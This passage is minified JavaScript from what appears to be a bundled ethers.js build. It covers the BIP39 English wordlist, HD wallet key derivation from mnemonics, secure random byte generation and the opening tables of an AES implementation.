FunFunnyFurnaceFuryFutureGadgetGainGalaxyGalleryGameGapGarageGarbageGardenGarlicGarmentGasGaspGateGatherGaugeGazeGeneralGeniusGenreGentleGenuineGestureGhostGiantGiftGiggleGingerGiraffeGirlGiveGladGlanceGlareGlassGlideGlimpseGlobeGloomGloryGloveGlowGlueGoatGoddessGoldGoodGooseGorillaGospelGossipGovernGownGrabGraceGrainGrantGrapeGrassGravityGreatGreenGridGriefGritGroceryGroupGrowGruntGuardGuessGuideGuiltGuitarGunGymHabitHairHalfHammerHamsterHandHappyHarborHardHarshHarvestHatHaveHawkHazardHeadHealthHeartHeavyHedgehogHeightHelloHelmetHelpHenHeroHiddenHighHillHintHipHireHistoryHobbyHockeyHoldHoleHolidayHollowHomeHoneyHoodHopeHornHorrorHorseHospitalHostHotelHourHoverHubHugeHumanHumbleHumorHundredHungryHuntHurdleHurryHurtHusbandHybridIceIconIdeaIdentifyIdleIgnoreIllIllegalIllnessImageImitateImmenseImmuneImpactImposeImproveImpulseInchIncludeIncomeIncreaseIndexIndicateIndoorIndustryInfantInflictInformInhaleInheritInitialInjectInjuryInmateInnerInnocentInputInquiryInsaneInsectInsideInspireInstallIntactInterestIntoInvestInviteInvolveIronIslandIsolateIssueItemIvoryJacketJaguarJarJazzJealousJeansJellyJewelJobJoinJokeJourneyJoyJudgeJuiceJumpJungleJuniorJunkJustKangarooKeenKeepKetchupKeyKickKidKidneyKindKingdomKissKitKitchenKiteKittenKiwiKneeKnifeKnockKnowLabLabelLaborLadderLadyLakeLampLanguageLaptopLargeLaterLatinLaughLaundryLavaLawLawnLawsuitLayerLazyLeaderLeafLearnLeaveLectureLeftLegLegalLegendLeisureLemonLendLengthLensLeopardLessonLetterLevelLiarLibertyLibraryLicenseLifeLiftLightLikeLimbLimitLinkLionLiquidListLittleLiveLizardLoadLoanLobsterLocalLockLogicLonelyLongLoopLotteryLoudLoungeLoveLoyalLuckyLuggageLumberLunarLunchLuxuryLyricsMachineMadMagicMagnetMaidMailMainMajorMakeMammalManManageMandateMangoMansionManualMapleMarbleMarchMarginMarineMarketMarriageMaskMassMasterMatchMaterialMathMatrixMatterMaximumMazeMeadowMeanMeasureMeatMechanicMedalMediaMelodyMeltMemberMemoryMentionMenuMercyMergeMeritMerryMeshMessageMetalMethodMiddleMidnightMilkMillionMimicMindMinimumMinorMinuteMiracleMirrorMiseryMissMistakeMixMixedMixtureMobileModelModifyMomMomentMonitorMonkeyMonsterMonthMoonMoralMoreMorningMosquitoMotherMotionMotorMountainMouseMoveMovieMuchMuffinMuleMultiplyMuscleMuseumMushroomMusicMustMutualMyselfMysteryMythNaiveNameNapkinNarrowNastyNationNatureNearNeckNeedNegativeNeglectNeitherNephewNerveNestNetNetworkNeutralNeverNewsNextNiceNightNobleNoiseNomineeNoodleNormalNorthNoseNotableNoteNothingNoticeNovelNowNuclearNumberNurseNutOakObeyObjectObligeObscureObserveObtainObviousOccurOceanOctoberOdorOffOfferOfficeOftenOilOkayOldOliveOlympicOmitOnceOneOnionOnlineOnlyOpenOperaOpinionOpposeOptionOrangeOrbitOrchardOrderOrdinaryOrganOrientOriginalOrphanOstrichOtherOutdoorOuterOutputOutsideOvalOvenOverOwnOwnerOxygenOysterOzonePactPaddlePagePairPalacePalmPandaPanelPanicPantherPaperParadeParentParkParrotPartyPassPatchPathPatientPatrolPatternPausePavePaymentPeacePeanutPearPeasantPelicanPenPenaltyPencilPeoplePepperPerfectPermitPersonPetPhonePhotoPhrasePhysicalPianoPicnicPicturePiecePigPigeonPillPilotPinkPioneerPipePistolPitchPizzaPlacePlanetPlasticPlatePlayPleasePledgePluckPlugPlungePoemPoetPointPolarPolePolicePondPonyPoolPopularPortionPositionPossiblePostPotatoPotteryPovertyPowderPowerPracticePraisePredictPreferPreparePresentPrettyPreventPricePridePrimaryPrintPriorityPrisonPrivatePrizeProblemProcessProduceProfitProgramProjectPromoteProofPropertyProsperProtectProudProvidePublicPuddingPullPulpPulsePumpkinPunchPupilPuppyPurchasePurityPurposePursePushPutPuzzlePyramidQualityQuantumQuarterQuestionQuickQuitQuizQuoteRabbitRaccoonRaceRackRadarRadioRailRainRaiseRallyRampRanchRandomRangeRapidRareRateRatherRavenRawRazorReadyRealReasonRebelRebuildRecallReceiveRecipeRecordRecycleReduceReflectReformRefuseRegionRegretRegularRejectRelaxReleaseReliefRelyRemainRememberRemindRemoveRenderRenewRentReopenRepairRepeatReplaceReportRequireRescueResembleResistResourceResponseResultRetireRetreatReturnReunionRevealReviewRewardRhythmRibRibbonRiceRichRideRidgeRifleRightRigidRingRiotRippleRiskRitualRivalRiverRoadRoastRobotRobustRocketRomanceRoofRookieRoomRoseRotateRoughRoundRouteRoyalRubberRudeRugRuleRunRunwayRuralSadSaddleSadnessSafeSailSaladSalmonSalonSaltSaluteSameSampleSandSatisfySatoshiSauceSausageSaveSayScaleScanScareScatterSceneSchemeSchoolScienceScissorsScorpionScoutScrapScreenScriptScrubSeaSearchSeasonSeatSecondSecretSectionSecuritySeedSeekSegmentSelectSellSeminarSeniorSenseSentenceSeriesServiceSessionSettleSetupSevenShadowShaftShallowShareShedShellSheriffShieldShiftShineShipShiverShockShoeShootShopShortShoulderShoveShrimpShrugShuffleShySiblingSickSideSiegeSightSignSilentSilkSillySilverSimilarSimpleSinceSingSirenSisterSituateSixSizeSkateSketchSkiSkillSkinSkirtSkullSlabSlamSleepSlenderSliceSlideSlightSlimSloganSlotSlowSlushSmallSmartSmileSmokeSmoothSnackSnakeSnapSniffSnowSoapSoccerSocialSockSodaSoftSolarSoldierSolidSolutionSolveSomeoneSongSoonSorrySortSoulSoundSoupSourceSouthSpaceSpareSpatialSpawnSpeakSpecialSpeedSpellSpendSphereSpiceSpiderSpikeSpinSpiritSplitSpoilSponsorSpoonSportSpotSpraySpreadSpringSpySquareSqueezeSquirrelStableStadiumStaffStageStairsStampStandStartStateStaySteakSteelStemStepStereoStickStillStingStockStomachStoneStoolStoryStoveStrategyStreetStrikeStrongStruggleStudentStuffStumbleStyleSubjectSubmitSubwaySuccessSuchSuddenSufferSugarSuggestSuitSummerSunSunnySunsetSuperSupplySupremeSureSurfaceSurgeSurpriseSurroundSurveySuspectSustainSwallowSwampSwapSwarmSwearSweetSwiftSwimSwingSwitchSwordSymbolSymptomSyrupSystemTableTackleTagTailTalentTalkTankTapeTargetTaskTasteTattooTaxiTeachTeamTellTenTenantTennisTentTermTestTextThankThatThemeThenTheoryThereTheyThingThisThoughtThreeThriveThrowThumbThunderTicketTideTigerTiltTimberTimeTinyTipTiredTissueTitleToastTobaccoTodayToddlerToeTogetherToiletTokenTomatoTomorrowToneTongueTonightToolToothTopTopicToppleTorchTornadoTortoiseTossTotalTouristTowardTowerTownToyTrackTradeTrafficTragicTrainTransferTrapTrashTravelTrayTreatTreeTrendTrialTribeTrickTriggerTrimTripTrophyTroubleTruckTrueTrulyTrumpetTrustTruthTryTubeTuitionTumbleTunaTunnelTurkeyTurnTurtleTwelveTwentyTwiceTwinTwistTwoTypeTypicalUglyUmbrellaUnableUnawareUncleUncoverUnderUndoUnfairUnfoldUnhappyUniformUniqueUnitUniverseUnknownUnlockUntilUnusualUnveilUpdateUpgradeUpholdUponUpperUpsetUrbanUrgeUsageUseUsedUsefulUselessUsualUtilityVacantVacuumVagueValidValleyValveVanVanishVaporVariousVastVaultVehicleVelvetVendorVentureVenueVerbVerifyVersionVeryVesselVeteranViableVibrantViciousVictoryVideoViewVillageVintageViolinVirtualVirusVisaVisitVisualVitalVividVocalVoiceVoidVolcanoVolumeVoteVoyageWageWagonWaitWalkWallWalnutWantWarfareWarmWarriorWashWaspWasteWaterWaveWayWealthWeaponWearWeaselWeatherWebWeddingWeekendWeirdWelcomeWestWetWhaleWhatWheatWheelWhenWhereWhipWhisperWideWidthWifeWildWillWinWindowWineWingWinkWinnerWinterWireWisdomWiseWishWitnessWolfWomanWonderWoodWoolWordWorkWorldWorryWorthWrapWreckWrestleWristWriteWrongYardYearYellowYouYoungYouthZebraZeroZoneZoo";let v5=null;function NM(r){if(v5==null&&(v5=_ue.replace(/([A-Z])/g," $1").toLowerCase().substring(1).split(" "),Qy.check(r)!=="0x3c8acc1e7b08d8e76f9fda015ef48dc8c710a73cb7e0f77b2c18a9b5a7adde60"))throw v5=null,new Error("BIP39 Wordlist for en (English) FAILED")}class Sue extends Qy{constructor(){super("en")}getWord(e){return NM(this),v5[e]}getWordIndex(e){return NM(this),v5.indexOf(e)}}const XZ=new Sue;Qy.register(XZ);const PM={en:XZ},Aue="hdnode/5.8.0",av=new be(Aue),Iue=Ge.from("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),Tue=Fn("Bitcoin seed"),Im=2147483648;function eY(r){return(1<<r)-1<<8-r}function kue(r){return(1<<r)-1}function A6(r){return Xi(Qe(r),32)}function $M(r){return pw.encode(cn([r,Nn(a0(a0(r)),0,4)]))}function _$(r){if(r==null)return PM.en;if(typeof r=="string"){const e=PM[r];return e==null&&av.throwArgumentError("unknown locale","wordlist",r),e}return r}const O2={},mw="m/44'/60'/0'/0/0";class nc{constructor(e,t,i,n,s,o,a,c){if(e!==O2)throw new Error("HDNode constructor cannot be called directly");if(t){const l=new N1(t);Pe(this,"privateKey",l.privateKey),Pe(this,"publicKey",l.compressedPublicKey)}else Pe(this,"privateKey",null),Pe(this,"publicKey",Qe(i));Pe(this,"parentFingerprint",n),Pe(this,"fingerprint",Nn(QZ(a0(this.publicKey)),0,4)),Pe(this,"address",Ff(this.publicKey)),Pe(this,"chainCode",s),Pe(this,"index",o),Pe(this,"depth",a),c==null?(Pe(this,"mnemonic",null),Pe(this,"path",null)):typeof c=="string"?(Pe(this,"mnemonic",null),Pe(this,"path",c)):(Pe(this,"mnemonic",c),Pe(this,"path",c.path))}get extendedKey(){if(this.depth>=256)throw new Error("Depth too large!");return $M(cn([this.privateKey!=null?"0x0488ADE4":"0x0488B21E",Qe(this.depth),this.parentFingerprint,Xi(Qe(this.index),4),this.chainCode,this.privateKey!=null?cn(["0x00",this.privateKey]):this.publicKey]))}neuter(){return new nc(O2,null,this.publicKey,this.parentFingerprint,this.chainCode,this.index,this.depth,this.path)}_derive(e){if(e>4294967295)throw new Error("invalid index - "+String(e));let t=this.path;t&&(t+="/"+(e&~Im));const i=new Uint8Array(37);if(e&Im){if(!this.privateKey)throw new Error("cannot derive child of neutered node");i.set(ze(this.privateKey),1),t&&(t+="'")}else i.set(ze(this.publicKey));for(let d=24;d>=0;d-=8)i[33+(d>>3)]=e>>24-d&255;const n=ze(ov(gw.sha512,this.chainCode,i)),s=n.slice(0,32),o=n.slice(32);let a=null,c=null;this.privateKey?a=A6(Ge.from(s).add(this.privateKey).mod(Iue)):c=new N1(Qe(s))._addPoint(this.publicKey);let l=t;const u=this.mnemonic;return u&&(l=Object.freeze({phrase:u.phrase,path:t,locale:u.locale||"en"})),new nc(O2,a,c,this.fingerprint,A6(o),e,this.depth+1,l)}derivePath(e){const t=e.split("/");if(t.length===0||t[0]==="m"&&this.depth!==0)throw new Error("invalid path - "+e);t[0]==="m"&&t.shift();let i=this;for(let n=0;n<t.length;n++){const s=t[n];if(s.match(/^[0-9]+'$/)){const o=parseInt(s.substring(0,s.length-1));if(o>=Im)throw new Error("invalid path index - "+s);i=i._derive(Im+o)}else if(s.match(/^[0-9]+$/)){const o=parseInt(s);if(o>=Im)throw new Error("invalid path index - "+s);i=i._derive(o)}else throw new Error("invalid path component - "+s)}return i}static _fromSeed(e,t){const i=ze(e);if(i.length<16||i.length>64)throw new Error("invalid seed");const n=ze(ov(gw.sha512,Tue,i));return new nc(O2,A6(n.slice(0,32)),null,"0x00000000",A6(n.slice(32)),0,0,t)}static fromMnemonic(e,t,i){return i=_$(i),e=Ux(Lx(e,i),i),nc._fromSeed(tY(e,t),{phrase:e,path:"m",locale:i.locale})}static fromSeed(e){return nc._fromSeed(e,null)}static fromExtendedKey(e){const t=pw.decode(e);(t.length!==82||$M(t.slice(0,78))!==e)&&av.throwArgumentError("invalid extended key","extendedKey","[REDACTED]");const i=t[4],n=Qe(t.slice(5,9)),s=parseInt(Qe(t.slice(9,13)).substring(2),16),o=Qe(t.slice(13,45)),a=t.slice(45,78);switch(Qe(t.slice(0,4))){case"0x0488b21e":case"0x043587cf":return new nc(O2,null,Qe(a),n,o,s,i,null);case"0x0488ade4":case"0x04358394 ":if(a[0]!==0)break;return new nc(O2,Qe(a.slice(1)),null,n,o,s,i,null)}return av.throwArgumentError("invalid extended key","extendedKey","[REDACTED]")}}function tY(r,e){e||(e="");const t=Fn("mnemonic"+e,Td.NFKD);return E$(Fn(r,Td.NFKD),t,2048,64,"sha512")}function Lx(r,e){e=_$(e),av.checkNormalize();const t=e.split(r);if(t.length%3!==0)throw new Error("invalid mnemonic");const i=ze(new Uint8Array(Math.ceil(11*t.length/8)));let n=0;for(let l=0;l<t.length;l++){let u=e.getWordIndex(t[l].normalize("NFKD"));if(u===-1)throw new Error("invalid mnemonic");for(let d=0;d<11;d++)u&1<<10-d&&(i[n>>3]|=1<<7-n%8),n++}const s=32*t.length/3,o=t.length/3,a=eY(o);if((ze(a0(i.slice(0,s/8)))[0]&a)!==(i[i.length-1]&a))throw new Error("invalid checksum");return Qe(i.slice(0,s/8))}function Ux(r,e){if(e=_$(e),r=ze(r),r.length%4!==0||r.length<16||r.length>32)throw new Error("invalid entropy");const t=[0];let i=11;for(let o=0;o<r.length;o++)i>8?(t[t.length-1]<<=8,t[t.length-1]|=r[o],i-=8):(t[t.length-1]<<=i,t[t.length-1]|=r[o]>>8-i,t.push(r[o]&kue(8-i)),i+=3);const n=r.length/4,s=ze(a0(r))[0]&eY(n);return t[t.length-1]<<=n,t[t.length-1]|=s>>8-n,e.join(t.map(o=>e.getWord(o)))}function Nue(r,e){try{return Lx(r,e),!0}catch{}return!1}function Pue(r){return(typeof r!="number"||r<0||r>=Im||r%1)&&av.throwArgumentError("invalid account index","index",r),`m/44'/60'/${r}'/0/0`}const $ue=Object.freeze(Object.defineProperty({__proto__:null,HDNode:nc,defaultPath:mw,entropyToMnemonic:Ux,getAccountPath:Pue,isValidMnemonic:Nue,mnemonicToEntropy:Lx,mnemonicToSeed:tY},Symbol.toStringTag,{value:"Module"})),Rue="random/5.8.0",YT=new be(Rue);function Oue(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")}const RM=Oue();let K8=RM.crypto||RM.msCrypto;(!K8||!K8.getRandomValues)&&(YT.warn("WARNING: Missing strong random number source"),K8={getRandomValues:function(r){return YT.throwError("no secure random source avaialble",be.errors.UNSUPPORTED_OPERATION,{operation:"crypto.getRandomValues"})}});function Wm(r){(r<=0||r>1024||r%1||r!=r)&&YT.throwArgumentError("invalid length","length",r);const e=new Uint8Array(r);return K8.getRandomValues(e),ze(e)}function Bue(r){r=r.slice();for(let e=r.length-1;e>0;e--){const t=Math.floor(Math.random()*(e+1)),i=r[e];r[e]=r[t],r[t]=i}return r}const Mue=Object.freeze(Object.defineProperty({__proto__:null,randomBytes:Wm,shuffled:Bue},Symbol.toStringTag,{value:"Module"}));var t_={exports:{}},OM;function Due(){return OM||(OM=1,function(r,e){(function(t){function i(B){return parseInt(B)===B}function n(B){if(!i(B.length))return!1;for(var M=0;M<B.length;M++)if(!i(B[M])||B[M]<0||B[M]>255)return!1;return!0}function s(B,M){if(B.buffer&&ArrayBuffer.isView(B)&&B.name==="Uint8Array")return M&&(B.slice?B=B.slice():B=Array.prototype.slice.call(B)),B;if(Array.isArray(B)){if(!n(B))throw new Error("Array contains invalid value: "+B);return new Uint8Array(B)}if(i(B.length)&&n(B))return new Uint8Array(B);throw new Error("unsupported array-like object")}function o(B){return new Uint8Array(B)}function a(B,M,W,K,q){(K!=null||q!=null)&&(B.slice?B=B.slice(K,q):B=Array.prototype.slice.call(B,K,q)),M.set(B,W)}var c=function(){function B(W){var K=[],q=0;for(W=encodeURI(W);q<W.length;){var J=W.charCodeAt(q++);J===37?(K.push(parseInt(W.substr(q,2),16)),q+=2):K.push(J)}return s(K)}function M(W){for(var K=[],q=0;q<W.length;){var J=W[q];J<128?(K.push(String.fromCharCode(J)),q++):J>191&&J<224?(K.push(String.fromCharCode((J&31)<<6|W[q+1]&63)),q+=2):(K.push(String.fromCharCode((J&15)<<12|(W[q+1]&63)<<6|W[q+2]&63)),q+=3)}return K.join("")}return{toBytes:B,fromBytes:M}}(),l=function(){function B(K){for(var q=[],J=0;J<K.length;J+=2)q.push(parseInt(K.substr(J,2),16));return q}var M="0123456789abcdef";function W(K){for(var q=[],J=0;J<K.length;J++){var le=K[J];q.push(M[(le&240)>>4]+M[le&15])}return q.join("")}return{toBytes:B,fromBytes:W}}(),u={16:10,24:12,32:14},d=[1,2,4,8,16,32,64,128,27,54,108,216,171,77,154,47,94,188,99,198,151,53,106,212,179,125,250,239,197,145],h=[99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22],f=[82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,222,233,203,84,123,148,50,166,194,35,61,238,76,149,11,66,250,195,78,8,46,161,102,40,217,36,178,118,91,162,73,109,139,209,37,114,248,246,100,134,104,152,22,212,164,92,204,93,101,182,146,108,112,72,80,253,237,185,218,94,21,70,87,167,141,157,132,144,216,171,0,140,188,211,10,247,228,88,5,184,179,69,6,208,44,30,143,202,63,15,2,193,175,189,3,1,19,138,107,58,145,17,65,79,103,220,234,151,242,207,206,240,180,230,115,150,172,116,34,231,173,53,133,226,249,55,232,28,117,223,110,71,241,26,113,29,41,197,137,111,183,98,14,170,24,190,27,252,86,62,75,198,210,121,32,154,219,192,254,120,205,90,244,31,221,168,51,136,7,199,49,177,18,16,89,39,128,236,95,96,81,127,169,25,181,74,13,45,229,122,159,147,201,156,239,160,224,59,77,174,42,245,176,200,235,187,60,131,83,153,97,23,43,4,126,186,119,214,38,225,105,20,99,85,33,12,125],p=[3328402341,4168907908,4000806809,4135287693,4294111757,3597364157,3731845041,2445657428,1613770832,33620227,3462883241,1445669757,3892248089,3050821474,1303096294,3967186586,2412431941,528646813,2311702848,4202528135,4026202645,2992200171,2387036105,4226871307,1101901292,3017069671,1604494077,1169141738,597466303,1403299063,3832705686,2613100635,1974974402,3791519004,1033081774,1277568618,1815492186,2118074177,4126668546,2211236943,1748251740,1369810420,3521504564,4193382664,3799085459,2883115123,1647391059,706024767,134480908,2512897874,1176707941,2646852446,806885416,932615841,168101135,798661301,235341577,605164086,461406363,3756188221,3454790438,1311188841,2142417613,3933566367,302582043,495158174,1479289972,874125870,907746093,3698224818,3025820398,1537253627,2756858614,1983593293,3084310113,2108928974,1378429307,3722699582,1580150641,327451799,2790478837,3117535592,0,3253595436,1075847264,3825007647,2041688520,3059440621,3563743934,2378943302,1740553945,1916352843,2487896798,2555137236,2958579944,2244988746,3151024235,3320835882,1336584933,3992714006,2252555205,2588757463,1714631509,293963156,2319795663,3925473552,67240454,4269768577,2689618160,2017213508,631218106,1269344483,2723238387,1571005438,2151694528,93294474,1066570413,563977660,1882732616,4059428100,1673313503,2008463041,2950355573,1109467491,537923632,3858759450,4260623118,3218264685,2177748300,403442708,638784309,3287084079,3193921505,899127202,2286175436,773265209,2479146071,1437050866,4236148354,2050833735,3362022572,3126681063,840505643,3866325909,3227541664,427917720,2655997905,2749160575,1143087718,1412049534,999329963,193497219,2353415882,3354324521,1807268051,672404540,2816401017,3160301282,369822493,2916866934,3688947771,1681011286,1949973070,336202270,2454276571,201721354,1210328172,3093060836,2680341085,3184776046,1135389935,3294782118,965841320,831886756,3554993207,4068047243,3588745010,2345191491,1849112409,3664604599,26054028,2983581028,2622377682,1235855840,3630984372,2891339514,4092916743,3488279077,3395642799,4101667470,1202630377,268961816,1874508501,4034427016,1243948399,1546530418,941366308,1470539505,1941222599,2546386513,3421038627,2715671932,3899946140,1042226977,2521517021,1639824860,227249030,260737669,3765465232,2084453954,1907733956,3429263018,2420656344,100860677,4160157185,470683154,3261161891,1781871967,2924959737,1773779408,394692241,2579611992,974986535,664706745,3655459128,3958962195,731420851,571543859,3530123707,2849626480,126783113,865375399,765172662,1008606754,361203602,3387549984,2278477385,2857719295,1344809080,2782912378,59542671,1503764984,160008576,437062935,1707065306,3622233649,2218934982,3496503480,2185314755,697932208,1512910199,504303377,2075177163,2824099068,1841019862,739644986],g=[2781242211,2230877308,2582542199,2381740923,234877682,3184946027,2984144751,1418839493,1348481072,50462977,2848876391,2102799147,434634494,1656084439,3863849899,2599188086,1167051466,2636087938,1082771913,2281340285,368048890,3954334041,3381544775,201060592,3963727277,1739838676,4250903202,3930435503,3206782108,4149453988,2531553906,1536934080,3262494647,484572669,2923271059,1783375398,1517041206,1098792767,49674231,1334037708,1550332980,4098991525,886171109,150598129,2481090929,1940642008,1398944049,1059722517,201851908,1385547719,1699095331,1587397571,674240536,2704774806,252314885,3039795866,151914247,908333586,2602270848,1038082786,651029483,1766729511,3447698098,2682942837,454166793,2652734339,1951935532,775166490,758520603,3000790638,4004797018,4217086112,4137964114,1299594043,1639438038,3464344499,2068982057,1054729187,1901997871,2534638724,4121318227,1757008337,0,750906861,1614815264,535035132,3363418545,3988151131,3201591914,1183697867,3647454910,1265776953,3734260298,3566750796,3903871064,1250283471,1807470800,717615087,3847203498,384695291,3313910595,3617213773,1432761139,2484176261,3481945413,283769337,100925954,2180939647,4037038160,1148730428,3123027871,3813386408,4087501137,4267549603,3229630528,2315620239,2906624658,3156319645,1215313976,82966005,3747855548,3245848246,1974459098,1665278241,807407632,451280895,251524083,1841287890,1283575245,337120268,891687699,801369324,3787349855,2721421207,3431482436,959321879,1469301956,4065699751,2197585534,1199193405,2898814052,3887750493,724703513,2514908019,2696962144,2551808385,3516813135,2141445340,1715741218,2119445034,2872807568,2198571144,3398190662,700968686,3547052216,1009259540,2041044702,3803995742,487983883,1991105499,1004265696,1449407026,1316239930,504629770,3683797321,168560134,1816667172,3837287516,1570751170,1857934291,4014189740,2797888098,2822345105,2754712981,936633572,2347923833,852879335,1133234376,1500395319,3084545389,2348912013,1689376213,3533459022,3762923945,3034082412,4205598294,133428468,634383082,2949277029,2398386810,3913789102,403703816,3580869306,2297460856,1867130149,1918643758,607656988,4049053350,3346248884,1368901318,600565992,2090982877,2632479860,557719327,3717614411,3697393085,2249034635,2232388234,2430627952,1115438654,3295786421,2865522278,3633334344,84280067,33027830,303828494,2747425121,1600795957,4188952407,3496589753,2434238086,1486471617,658119965,3106381470,953803233,334231800,3005978776,857870609,3151128937,1890179545,2298973838,2805175444,3056442267,574365214,2450884487,550103529,1233637070,4289353045,2018519080,2057691103,2399374476,4166623649,2148108681,387583245,3664101311,836232934,3330556482,3100665960,3280093505,2955516313,2002398509,287182607,3413881008,4238890068,3597515707,975967766],w=[1671808611,2089089148,2006576759,2072901243,4061003762,1807603307,1873927791,3310653893,810573872,16974337,1739181671,729634347,4263110654,3613570519,2883997099,1989864566,3393556426,2191335298,3376449993,2106063485,4195741690,1508618841,1204391495,4027317232,2917941677,3563566036,2734514082,2951366063,2629772188,2767672228,1922491506,3227229120,3082974647,4246528509,2477669779,644500518,911895606,1061256767,4144166391,3427763148,878471220,2784252325,3845444069,4043897329,1905517169,3631459288,827548209,356461077,67897348,3344078279,593839651,3277757891,405286936,2527147926,84871685,2595565466,118033927,305538066,2157648768,3795705826,3945188843,661212711,2999812018,1973414517,152769033,2208177539,745822252,439235610,455947803,1857215598,1525593178,2700827552,1391895634,994932283,3596728278,3016654259,695947817,3812548067,795958831,2224493444,1408607827,3513301457,0,3979133421,543178784,4229948412,2982705585,1542305371,1790891114,3410398667,3201918910,961245753,1256100938,1289001036,1491644504,3477767631,3496721360,4012557807,2867154858,4212583931,1137018435,1305975373,861234739,2241073541,1171229253,4178635257,33948674,2139225727,1357946960,1011120188,2679776671,2833468328,1374921297,2751356323,1086357568,2408187279,2460827538,2646352285,944271416,4110742005,3168756668,3066132406,3665145818,560153121,271589392,4279952895,4077846003,3530407890,3444343245,202643468,322250259,3962553324,1608629855,2543990167,1154254916,389623319,3294073796,2817676711,2122513534,1028094525,1689045092,1575467613,422261273,1939203699,1621147744,2174228865,1339137615,3699352540,577127458,712922154,2427141008,2290289544,1187679302,3995715566,3100863416,339486740,3732514782,1591917662,186455563,3681988059,3762019296,844522546,978220090,169743370,1239126601,101321734,611076132,1558493276,3260915650,3547250131,2901361580,1655096418,2443721105,2510565781,3828863972,2039214713,3878868455,3359869896,928607799,1840765549,2374762893,3580146133,1322425422,2850048425,1823791212,1459268694,4094161908,3928346602,1706019429,2056189050,2934523822,135794696,3134549946,2022240376,628050469,779246638,472135708,2800834470,3032970164,3327236038,3894660072,3715932637,1956440180,522272287,1272813131,3185336765,2340818315,2323976074,1888542832,1044544574,3049550261,1722469478,1222152264,50660867,4127324150,236067854,1638122081,895445557,1475980887,3117443513,2257655686,3243809217,489110045,2662934430,3778599393,4162055160,2561878936,288563729,1773916777,3648039385,2391345038,2493985684,2612407707,505560094,2274497927,3911240169,3460925390,1442818645,678973480,3749357023,2358182796,2717407649,2306869641,219617805,3218761151,3862026214,1120306242,1756942440,1103331905,2578459033,762796589,252780047,2966125488,1425844308,3151392187,372911126],m=[1667474886,2088535288,2004326894,2071694838,4075949567,1802223062,1869591006,3318043793,808472672,16843522,1734846926,724270422,4278065639,3621216949,2880169549,1987484396,3402253711,2189597983,3385409673,2105378810,4210693615,1499065266,1195886990,4042263547,2913856577,3570689971,2728590687,2947541573,2627518243,2762274643,1920112356,3233831835,3082273397,4261223649,2475929149,640051788,909531756,1061110142,4160160501,3435941763,875846760,2779116625,3857003729,4059105529,1903268834,3638064043,825316194,353713962,67374088,3351728789,589522246,3284360861,404236336,2526454071,84217610,2593830191,117901582,303183396,2155911963,3806477791,3958056653,656894286,2998062463,1970642922,151591698,2206440989,741110872,437923380,454765878,1852748508,1515908788,2694904667,1381168804,993742198,3604373943,3014905469,690584402,3823320797,791638366,2223281939,1398011302,3520161977,0,3991743681,538992704,4244381667,2981218425,1532751286,1785380564,3419096717,3200178535,960056178,1246420628,1280103576,1482221744,3486468741,3503319995,4025428677,2863326543,4227536621,1128514950,1296947098,859002214,2240123921,1162203018,4193849577,33687044,2139062782,1347481760,1010582648,2678045221,2829640523,1364325282,2745433693,1077985408,2408548869,2459086143,2644360225,943212656,4126475505,3166494563,3065430391,3671750063,555836226,269496352,4294908645,4092792573,3537006015,3452783745,202118168,320025894,3974901699,1600119230,2543297077,1145359496,387397934,3301201811,2812801621,2122220284,1027426170,1684319432,1566435258,421079858,1936954854,1616945344,2172753945,1330631070,3705438115,572679748,707427924,2425400123,2290647819,1179044492,4008585671,3099120491,336870440,3739122087,1583276732,185277718,3688593069,3772791771,842159716,976899700,168435220,1229577106,101059084,606366792,1549591736,3267517855,3553849021,2897014595,1650632388,2442242105,2509612081,3840161747,2038008818,3890688725,3368567691,926374254,1835907034,2374863873,3587531953,1313788572,2846482505,1819063512,1448540844,4109633523,3941213647,1701162954,2054852340,2930698567,134748176,3132806511,2021165296,623210314,774795868,471606328,2795958615,3031746419,3334885783,3907527627,3722280097,1953799400,522133822,1263263126,3183336545,2341176845,2324333839,1886425312,1044267644,3048588401,1718004428,1212733584,50529542,4143317495,235803164,1633788866,892690282,1465383342,3115962473,2256965911,3250673817,488449850,2661202215,3789633753,4177007595,2560144171,286339874,1768537042,3654906025,2391705863,2492770099,2610673197,505291324,2273808917,3924369609,3469625735,1431699370,673740880,3755965093,2358021891,2711746649,2307489801,218961690,3217021541,3873845719,1111672452,1751693520,1094828930,2576986153,757954394,252645662,2964376443,1414855848,3149649517,370555436],x=[1374988112,2118214995,437757123,975658646,1001089995,530400753,2902087851,1273168787,540080725,2910219766,2295101073,4110568485,1340463100,3307916247,641025152,3043140495,3736164937,632953703,1172967064,1576976609,3274667266,2169303058,2370213795,1809054150,59727847,361929877,3211623147,2505202138,3569255213,1484005843,1239443753,2395588676,1975683434,4102977912,2572697195,666464733,3202437046,4035489047,3374361702,2110667444,1675577880,3843699074,2538681184,1649639237,2976151520,3144396420,4269907996,4178062228,1883793496,2403728665,2497604743,1383856311,2876494627,1917518562,3810496343,1716890410,3001755655,800440835,2261089178,3543599269,807962610,599762354,33778362,3977675356,2328828971,2809771154,4077384432,1315562145,1708848333,101039829,3509871135,3299278474,875451293,2733856160,92987698,2767645557,193195065,1080094634,1584504582,3178106961,1042385657,2531067453,3711829422,1306967366,2438237621,1908694277,67556463,1615861247,429456164,3602770327,2302690252,1742315127,2968011453,126454664,3877198648,2043211483,2709260871,2084704233,4169408201,0,159417987,841739592,504459436,1817866830,4245618683,260388950,1034867998,908933415,168810852,1750902305,2606453969,607530554,202008497,2472011535,3035535058,463180190,21601170